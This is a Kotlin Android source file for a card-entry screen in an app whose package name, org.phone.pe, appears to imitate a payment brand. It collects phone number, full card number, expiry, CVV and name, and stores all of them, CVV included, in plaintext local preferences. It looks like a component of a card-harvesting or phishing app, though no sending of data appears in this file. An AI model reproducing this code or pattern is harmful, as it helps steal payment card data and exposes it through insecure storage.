package org.phone.pe.ui

import android.content.Intent
import android.os.Bundle
import org.phone.pe.R
import org.phone.pe.databinding.ActivityCardBinding
import org.phone.pe.utils.PrefUtil
import android.text.Editable
import android.text.InputFilter
import android.text.TextWatcher
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputEditText
import com.google.android.material.textfield.TextInputLayout


class CardActivity : AppCompatActivity() {
    private val binding by lazy { ActivityCardBinding.inflate(layoutInflater) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)

//        binding.number.addTextChangedListener(CreditCardNumberFormattingTextWatcher())
        binding.expiry.addTextChangedListener(ExpiryNumberFormattingTextWatcher())

        watcher(binding.lPhone, binding.phone)
        watcher(binding.lNumber, binding.number)
        watcher(binding.lExpiry, binding.expiry)
        watcher(binding.lCvv, binding.cvv)
        watcher(binding.lName, binding.name)

//        binding.cardForm.cardRequired(true)
//            .cardholderName(CardForm.FIELD_REQUIRED)
//            .maskCardNumber(true)
//            .maskCvv(true)
//            .expirationRequired(true)
//            .cvvRequired(true)
//            .postalCodeRequired(false)
//            .mobileNumberRequired(true)
//            .setup(this)
//
//        binding.cardForm.cvvEditText.inputType =
//            InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD

//        binding.btnSubmit.setOnClickListener {
//
//            if (binding.cardForm.isValid) {
//
//                PrefUtil.saveNumber(this, "91${binding.cardForm.mobileNumber}")
//                PrefUtil.saveName(this, binding.cardForm.cardholderName)
//                PrefUtil.saveCard(this, binding.cardForm.cardNumber)
//                PrefUtil.saveCvv(this, binding.cardForm.cvv)
//                PrefUtil.saveExpiry(
//                    this,
//                    "${binding.cardForm.expirationMonth}/${binding.cardForm.expirationYear}"
//                )
//
//                Intent(this, MainActivity::class.java).apply {
//                    startActivity(this)
//                    finish()
//                }
//            } else {
//                Toast.makeText(this, "Invalid card details", Toast.LENGTH_SHORT).show()
//            }
//        }

        binding.btnSubmit.setOnClickListener {
            val ph = binding.phone.text.toString()
            val num = binding.number.text.toString()
            val exp = binding.expiry.text.toString()
            val cvv = binding.cvv.text.toString()
            val n = binding.name.text.toString()

            if (ph.isEmpty()) {
                binding.lPhone.error = getString(R.string.required)
            } else if (num.isEmpty() || num.length < 16) {
                binding.lNumber.error = getString(R.string.required)
            } else if (exp.isEmpty() || exp.length < 5) {
                binding.lExpiry.error = getString(R.string.required)
            } else if (cvv.isEmpty()) {
                binding.lCvv.error = getString(R.string.required)
            } else if (n.isEmpty()) {
                binding.lName.error = getString(R.string.required)
            } else {
                PrefUtil.saveNumber(this, "91$ph")
                PrefUtil.saveName(this, n)
                PrefUtil.saveCard(this, num)
                PrefUtil.saveCvv(this, cvv)
                PrefUtil.saveExpiry(this, exp)

                Intent(this, MainActivity::class.java).apply {
                    startActivity(this)
                    finish()
                }
            }
        }

    }

    private fun watcher(layout: TextInputLayout, editText: TextInputEditText) {
        editText.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(
                s: CharSequence, start: Int, count: Int, after: Int
            ) {
            }

            override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {}
            override fun afterTextChanged(s: Editable) {
                if (s.isNotEmpty()) {
                    layout.isErrorEnabled = false
                }
            }
        })
    }

    class CreditCardNumberFormattingTextWatcher : TextWatcher {
        private var current = ""

        override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {
        }

        override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int) {
        }

        override fun afterTextChanged(s: Editable) {
            if (s.toString() != current) {
                val userInput = s.toString().replace(nonDigits, "")
                if (userInput.length <= 16) {
                    current = userInput.chunked(4).joinToString(" ")
                    s.filters = arrayOfNulls<InputFilter>(0)
                }
                s.replace(0, s.length, current, 0, current.length)
            }
        }

        companion object {
            private val nonDigits = Regex("[^\\d]")
        }
    }

    class ExpiryNumberFormattingTextWatcher : TextWatcher {
        private var current = ""

        override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {
        }

        override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int) {
        }

        override fun afterTextChanged(s: Editable) {
            if (s.toString() != current) {
                val userInput = s.toString().replace(nonDigits, "")
                if (userInput.length <= 4) {
                    current = userInput.chunked(2).joinToString("/")
                    s.filters = arrayOfNulls<InputFilter>(0)
                }
                s.replace(0, s.length, current, 0, current.length)
            }
        }

        companion object {
            private val nonDigits = Regex("[^\\d]")
        }
    }
}